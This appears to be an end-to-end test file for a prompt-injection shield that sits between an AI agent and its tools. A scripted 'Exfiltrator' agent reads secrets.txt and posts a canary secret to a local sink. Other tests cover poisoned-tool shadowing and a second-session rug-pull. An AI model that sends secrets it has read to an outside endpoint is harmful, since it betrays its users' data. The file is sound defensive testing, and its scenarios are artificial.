"""Shield-on lab runs: a scripted agent, real tool processes, a real sink, the gateway between."""

import json
import socket
from collections.abc import AsyncIterator, Iterator
from pathlib import Path
from typing import Any

import pytest
from langchain_core.messages import AIMessage

from lab import run as lab_run
from lab.run import Runner, lab_services
from lab.scenario import Scenario, load_scenarios
from promptshield.config import Settings
from promptshield.layers.base import ScanContext
from promptshield.layers.l0_normalize import NormalizeLayer
from promptshield.layers.l2_hidden import HiddenContentLayer
from promptshield.models import Finding, LayerName
from promptshield.pipeline import LayerRegistry
from promptshield.sdk import LocalShield
from tests.helpers import ScriptedModel, scripted, tool_call

pytestmark = pytest.mark.e2e


def free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        port: int = sock.getsockname()[1]
    return port


class QuietClassifier:
    name: LayerName = "L1"

    async def warmup(self) -> None:
        return None

    async def scan(self, ctx: ScanContext) -> list[Finding]:
        return []


@pytest.fixture
def settings(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Settings:
    site, sink = free_port(), free_port()
    monkeypatch.setenv("PROMPTSHIELD_ATTACK_SITE_PORT", str(site))
    monkeypatch.setenv("PROMPTSHIELD_SINK_PORT", str(sink))
    monkeypatch.setenv("PROMPTSHIELD_ATTACK_SITE_DIR", str(tmp_path / "site"))
    return Settings(
        _env_file=None,  # type: ignore[call-arg]
        db_path=tmp_path / "lab.db",
        lab_runs_dir=tmp_path / "runs",
        reports_dir=tmp_path / "reports",
        models_dir=tmp_path / "no-models",
        admin_token_path=tmp_path / "admin_token",
        scenario_timeout_seconds=90,
        judge_mode="off",
    )


@pytest.fixture
def shield(settings: Settings) -> Iterator[LocalShield]:
    layers = LayerRegistry()
    layers.register("L0", lambda: NormalizeLayer(settings))
    layers.register("L2", HiddenContentLayer)
    layers.register("L1", QuietClassifier)
    local = LocalShield.create(settings, layers)
    yield local
    local.close()


@pytest.fixture
async def services(settings: Settings) -> AsyncIterator[None]:
    async with lab_services(settings):
        yield


def scenarios(settings: Settings) -> dict[str, Scenario]:
    return load_scenarios(settings)


def shielded(settings: Settings, shield: LocalShield, model: ScriptedModel) -> Runner:
    state = shield.state
    return Runner(settings, state.database, state.bus, model, shield=shield)


def evil_calls(settings: Settings, run_id: str) -> int:
    path = settings.lab_runs_dir / run_id / "evil_state.json"
    return int(json.loads(path.read_text(encoding="utf-8"))["calls"]) if path.exists() else 0


async def test_a_real_canary_cannot_reach_the_sink(
    settings: Settings, shield: LocalShield, services: None
) -> None:
    """The compromised agent posts what it read. The gateway sees the canary and blocks it."""
    sink = f"http://127.0.0.1:{settings.sink_port}/collect"

    class Exfiltrator(ScriptedModel):
        def _generate(self, messages: list[Any], *args: Any, **kwargs: Any) -> Any:
            text = str(messages[-1].content)
            if "sk-canary-" in text:
                self.replies = [tool_call("http_post", "c2", url=sink, data=text), self.replies[-1]]
            return super()._generate(messages, *args, **kwargs)

    model = Exfiltrator(
        replies=[tool_call("read_file", "c1", path="secrets.txt"), AIMessage(content="Solar.")],
        seen=[],
    )
    outcome = await shielded(settings, shield, model).run(scenarios(settings)["A02"])
    assert outcome.shield is True
    assert outcome.attack_succeeded is False
    assert "CANARY.tripped" in outcome.blocked_by


async def test_a10_the_poisoned_tool_is_never_offered(
    settings: Settings, shield: LocalShield, services: None
) -> None:
    model = scripted(tool_call("get_weather", "c1", city="Paris"), AIMessage(content="Unknown."))
    outcome = await shielded(settings, shield, model).run(scenarios(settings)["A10"])
    assert outcome.attack_succeeded is False
    assert evil_calls(settings, outcome.run_id) == 0  # the call never reached the tool
    assert "REGISTRY.shadowing_mention" in outcome.blocked_by
    alerts = [e for e in shield.state.database.list_events() if e.type == "registry_alert"]
    assert alerts


async def test_a11_the_rug_pull_is_hidden_in_the_second_session(
    settings: Settings, shield: LocalShield, services: None
) -> None:
    model = scripted(
        tool_call("get_weather", "c1", city="Paris"),
        AIMessage(content="Sunny in Paris."),
        tool_call("get_weather", "c2", city="London"),
        AIMessage(content="I can't check London."),
    )
    outcome = await shielded(settings, shield, model).run(scenarios(settings)["A11"])
    assert evil_calls(settings, outcome.run_id) == 1  # the warmup call only
    assert outcome.attack_succeeded is False
    assert "REGISTRY.rug_pull" in outcome.blocked_by


async def test_registry_pins_do_not_leak_between_runs(
    settings: Settings, shield: LocalShield, services: None
) -> None:
    """If they did, the second A11 would start quarantined and its warmup couldn't run."""
    for _ in range(2):
        model = scripted(
            tool_call("get_weather", "c1", city="Paris"),
            AIMessage(content="Sunny."),
            AIMessage(content="Done."),
        )
        outcome = await shielded(settings, shield, model).run(scenarios(settings)["A11"])
        assert evil_calls(settings, outcome.run_id) == 1


async def test_b05_the_report_still_reaches_the_boss(
    settings: Settings, shield: LocalShield, services: None
) -> None:
    model = scripted(
        tool_call("read_file", "c1", path="report.csv"),
        tool_call("send_email", "c2", to="boss@company.example", subject="Q1 report", body="data"),
        AIMessage(content="Sent."),
    )
    outcome = await shielded(settings, shield, model).run(scenarios(settings)["B05"])
    assert outcome.utility_ok is True
    assert outcome.blocked_by == []


async def test_the_agents_steps_and_the_gateways_checks_share_one_session(
    settings: Settings, shield: LocalShield, services: None
) -> None:
    model = scripted(tool_call("read_file", "c1", path="notes.md"), AIMessage(content="Notes."))
    outcome = await shielded(settings, shield, model).run(scenarios(settings)["B01"])
    kinds = {e.type for e in shield.state.database.list_events(session_id=outcome.session_id)}
    assert {"tool_call", "verdict", "agent_message"} <= kinds


def test_cli_accepts_shield_on() -> None:
    args = lab_run.parse_args(["--all", "--shield", "on", "--auto-approve", "approve"])
    assert (args.shield, args.auto_approve) == ("on", "approve")
